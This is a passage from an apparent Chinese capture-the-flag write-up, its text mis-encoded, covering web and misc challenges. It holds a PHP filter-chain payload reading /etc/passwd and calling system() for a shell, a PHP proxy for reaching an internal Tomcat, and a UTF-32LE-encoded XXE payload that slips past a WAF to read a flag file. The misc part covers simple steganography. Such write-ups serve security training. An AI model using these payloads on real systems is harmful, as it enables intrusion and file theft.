nvert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</a></p><p>POST<br>2&#x3D;system(â€˜lsâ€™);</p>
          </div>


<p>ç”¨ä¸Šé¢ä¸¤ç§æ–¹æ³•éƒ½èƒ½getshellï¼Œä½†æ˜¯ä¼šå‘ç°è¯»ä¸äº†flagï¼Œæ²¡æƒé™</p>
<p>ç”¨<code>ps -aux</code>å‘½ä»¤çœ‹ä¸‹è¿›ç¨‹ï¼Œå‘ç°rootç”¨æˆ·å¼€äº†ä¸ª<code>tomcat</code>æœåŠ¡</p>
<p><img src="/img/wp/2022/2022qgb-13.png"></p>
<p>curlè¯•ä¸€ä¸‹tomcatçš„é»˜è®¤8080ç«¯å£ï¼Œæœ‰å†…å®¹</p>
<p><img src="/img/wp/2022/2022qgb-14.png"></p>
<p>ä½†æ˜¯å‘½ä»¤è¡Œä¸å¥½åšé¢˜ï¼Œå°±å…ˆè€ƒè™‘ä»£ç†å‡ºæ¥</p>
<p>webæ ¹ç›®å½•ä¸‹ä¼ ä¸ª<code>proxy.php</code>ï¼Œæ³¨æ„ä¿®æ”¹ä¸‹åœ°å€</p>
<p><a href="https://blog.csdn.net/weixin_44599931/article/details/124981841">é¡¹ç›®åœ°å€</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">    PHPæ¥å£ä»£ç†è½¬å‘ï¼š</span><br><span class="hljs-comment">    ä»¥Golangæ¥å£è½¬å‘ä¸ºä¾‹ï¼›</span><br><span class="hljs-comment">    å¦‚æœ‰å¿…è¦ï¼Œè¯·è®¾ç½®å†…ç½‘IPä¸ºç™½åå•ï¼›</span><br><span class="hljs-comment">    å»ºè®®å†…ç½‘æ¥å£è¿”å›æ ¼å¼ï¼šContent-Type: text/html; charset=UTF-8ï¼›</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">    ä½¿ç”¨ç¤ºä¾‹ï¼š</span><br><span class="hljs-comment">    $host = &quot;http://127.0.0.2&quot;; // å¤–ç½‘ç½‘å€ï¼ˆä¸»ç½‘å€æˆ–æœ‰éƒ¨åˆ†è·¯å¾„ï¼‰</span><br><span class="hljs-comment">    $intranet = &#x27;http://127.0.0.4&#x27;; // å†…ç½‘ç½‘å€ï¼ˆä¸»ç½‘å€æˆ–æœ‰éƒ¨åˆ†è·¯å¾„ï¼‰</span><br><span class="hljs-comment">    $php_proxy = new php_proxy();</span><br><span class="hljs-comment">    $back = $php_proxy-&gt;request_intranet($host, $intranet);</span><br><span class="hljs-comment">    echo $back;</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">php_proxy</span></span>&#123;<br> <br>    <span class="hljs-comment">// å‘é€getã€postè¯·æ±‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request_option</span>(<span class="hljs-params"><span class="hljs-variable">$request_url</span>=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$method</span>=<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-variable">$request_data</span>=[], <span class="hljs-variable">$to_json</span>=<span class="hljs-literal">false</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$request_url</span>)) &#123;<br>            <span class="hljs-variable">$back</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;request_url is null&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;post&#x27;</span> || <span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;POST&#x27;</span>)&#123;<br>                <span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$request_data</span>);<br>                <span class="hljs-variable">$options</span> = [<br>                    <span class="hljs-string">&#x27;http&#x27;</span> =&gt; [<br>                        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-comment">// æ³¨æ„è¦å¤§å†™</span><br>                        <span class="hljs-string">&#x27;header&#x27;</span> =&gt; <span class="hljs-string">&#x27;Content-type:application/x-www-form-urlencoded&#x27;</span>,<br>                        <span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>                        <span class="hljs-string">&#x27;ignore_errors&#x27;</span>=&gt; <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¿½ç•¥æŠ¥é”™ï¼Œç›´æ¥è¿”å›æ¥å£å†…å®¹</span><br>                    ],<br>                ];<br>                <span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$options</span>);<br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-literal">false</span>, <span class="hljs-variable">$context</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;get&#x27;</span>|| <span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br>                <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$request_url</span>);<br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">// ä¸æŠ“å–å¤´éƒ¨ä¿¡æ¯ã€‚åªè¿”å›æ•°æ®</span><br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_TIMEOUT, (<span class="hljs-keyword">int</span>)<span class="hljs-number">60000</span>); <span class="hljs-comment">// è¶…æ—¶è®¾ç½®</span><br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 1è¡¨ç¤ºä¸è¿”å›boolå€¼</span><br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>                <span class="hljs-comment">// $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); // è·å–æ¥å£çŠ¶æ€ç </span><br>                <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>            &#125;<br> <br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable">$data</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$to_json</span> == <span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$back</span>, <span class="hljs-literal">true</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable">$back</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// è·å–å®Œæ•´ç½‘å€</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_url</span>(<span class="hljs-params"></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTPS&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTPS&#x27;</span>] == <span class="hljs-string">&#x27;on&#x27;</span>) &#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://&#x27;</span>;<br>        &#125;<br>        <span class="hljs-comment">//è¿™é‡Œçš„é€»è¾‘ä¼šå¯¼è‡´è®¿é—®å†…ç½‘çš„URIä¸å†…ç½‘ç›¸åŒ</span><br>        <span class="hljs-comment">//é‡‡ç”¨PATH_INFOçš„æ¨¡å¼æ¥è¡¨ç¤ºå†…ç½‘éœ€è¦çš„URI</span><br>        <span class="hljs-comment">//å³ å¤– http://127.0.0.1/proxy.php/index =&gt; å†… http://127.0.0.1/index</span><br>        <span class="hljs-comment">// return $url.$_SERVER[&#x27;SERVER_NAME&#x27;].&#x27;:&#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;].$_SERVER[&#x27;REQUEST_URI&#x27;];</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$url</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>];<br>    &#125;<br> <br>    <span class="hljs-comment">// æ˜¯post</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_post</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="hljs-string">&#x27;POST&#x27;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// æ˜¯get</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_get</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="hljs-string">&#x27;GET&#x27;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// ç”Ÿæˆå†…ç½‘ç½‘å€ï¼šæŠŠå¤–ç½‘ç½‘å€è§£æåˆ°å†…ç½‘ç½‘å€</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_url</span>()); <span class="hljs-comment">// å®é™…ä»£ç†åœ°å€ï¼ˆå°±æ˜¯æ›¿æ¢ä¸»ç½‘å€æˆ–è·¯å¾„ï¼‰</span><br>    &#125;<br> <br>    <span class="hljs-comment">// è½¬å‘æ¥å£</span><br>    <span class="hljs-comment">// è¯·ä»æ­¤å¤„è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request_intranet</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-comment">// æµ‹è¯•çš„å†…ç½‘è¯·æ±‚åœ°å€ï¼š$request_url = http://127.0.0.l:8000/api.gen1/admin</span><br>        <span class="hljs-variable">$request_url</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make_request_url</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">is_post</span>())&#123;<br>            <span class="hljs-variable">$request_array</span> = <span class="hljs-variable">$_REQUEST</span>; <span class="hljs-comment">// è¯·æ±‚å‚æ•°æ•°ç»„</span><br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">request_option</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-variable">$request_array</span>, <span class="hljs-literal">false</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">is_get</span>())&#123;<br>            <span class="hljs-variable">$request_array</span> = [];<br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">request_option</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-variable">$request_array</span>, <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$back</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$back</span>;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">// è¿”å›æ•°æ®</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;http://82.157.177.192:46728&quot;</span>; <span class="hljs-comment">// å¤–ç½‘ç½‘å€ï¼ˆä¸»ç½‘å€æˆ–æœ‰éƒ¨åˆ†è·¯å¾„ï¼‰</span><br><span class="hljs-variable">$intranet</span> = <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>; <span class="hljs-comment">// å†…ç½‘ç½‘å€ï¼ˆä¸»ç½‘å€æˆ–æœ‰éƒ¨åˆ†è·¯å¾„ï¼‰</span><br><span class="hljs-variable">$php_proxy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">php_proxy</span>();<br><span class="hljs-variable">$back</span> = <span class="hljs-variable">$php_proxy</span>-&gt;<span class="hljs-title function_ invoke__">request_intranet</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$back</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åè®¿é—®<code>http://IP:PORT/proxy.php/index</code>ï¼Œå°±ç›¸å½“äºè®¿é—®<code>http://InnerIP:InnerPORT/index</code></p>
<p><img src="/img/wp/2022/2022qgb-15.png"></p>
<p>æŠ“åŒ…ä¸€çœ‹ï¼Œå¾ˆæ˜æ˜¾çš„<code>XXE</code></p>
<p>fuzzä¸€ä¸‹ï¼Œå¯æ¶ï¼Œç«Ÿç„¶è¿˜æœ‰waf</p>
<p><img src="/img/wp/2022/2022qgb-16.png"></p>
<p>å¯ä»¥åˆ©ç”¨ç¼–ç è½¬æ¢ç»•è¿‡waf<br><code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code></p>
<p>è¿™é‡Œæ”¾ä¸€ä¸ªç¼–ç åçš„payloadï¼ˆæœ¬åœ°dtdè¯»æ–‡ä»¶æŠ¥é”™å¸¦flagï¼‰ï¼š<br><code>%3C%00%00%00%3F%00%00%00x%00%00%00m%00%00%00l%00%00%00+%00%00%00v%00%00%00e%00%00%00r%00%00%00s%00%00%00i%00%00%00o%00%00%00n%00%00%00%3D%00%00%00%22%00%00%001%00%00%00.%00%00%000%00%00%00%22%00%00%00+%00%00%00%3F%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00D%00%00%00O%00%00%00C%00%00%00T%00%00%00Y%00%00%00P%00%00%00E%00%00%00+%00%00%00m%00%00%00e%00%00%00s%00%00%00s%00%00%00a%00%00%00g%00%00%00e%00%00%00+%00%00%00%5B%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00t%00%00%00m%00%00%00p%00%00%00%2F%00%00%001%00%00%00.%00%00%00d%00%00%00t%00%00%00d%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00c%00%00%00o%00%00%00n%00%00%00d%00%00%00i%00%00%00t%00%00%00i%00%00%00o%00%00%00n%00%00%00+%00%00%00%27%00%00%00a%00%00%00a%00%00%00a%00%00%00%29%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00+%00%00%00%22%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%006%00%00%00%3B%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00n%00%00%00o%00%00%00n%00%00%00e%00%00%00x%00%00%00i%00%00%00s%00%00%00t%00%00%00e%00%00%00n%00%00%00t%00%00%00%2F%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3B%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00%3E%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00L%00%00%00E%00%00%00M%00%00%00E%00%00%00N%00%00%00T%00%00%00+%00%00%00a%00%00%00a%00%00%00+%00%00%00%28%00%00%00b%00%00%00b%00%00%00%27%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%25%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00%5D%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00r%00%00%00o%00%00%00o%00%00%00t%00%00%00%3C%00%00%00%2F%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00</code></p>
<p><img src="/img/wp/2022/2022qgb-17.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Welcome-to-QGB"><a href="#Welcome-to-QGB" class="headerlink" title="Welcome_to_QGB"></a>Welcome_to_QGB</h2><p><code>V2VsY29tZV90b19RR0I=</code>base64è§£ç å¾—åˆ°<code>Welcome_to_QGB</code></p>
<h2 id="æ‰¾æ‰¾GIF"><a href="#æ‰¾æ‰¾GIF" class="headerlink" title="æ‰¾æ‰¾GIF"></a>æ‰¾æ‰¾GIF</h2><p>ä¼ªåŠ å¯†ï¼Œ09-&gt;00ï¼Œå–å‡ºaaa</p>
<p>aaaæ·»åŠ åç¼€pngï¼Œä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š<code>okv90D%&amp;ffgbd</code></p>
<p>è§£å‹å¾—åˆ°bbbï¼Œæ·»åŠ gifå¤´<code>GIF89a</code>ï¼Œå¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022qgb-18.png"></p>
<h2 id="å¤§ä½¬å¤§ä½¬"><a href="#å¤§ä½¬å¤§ä½¬" class="headerlink" title="å¤§ä½¬å¤§ä½¬"></a>å¤§ä½¬å¤§ä½¬</h2><p>lsbæå–å‡ºpng</p>
<p><img src="/img/wp/2022/2022qgb-19.png"></p>
<p>ä¿®æ”¹é«˜åº¦å¾—åˆ°flag</p>
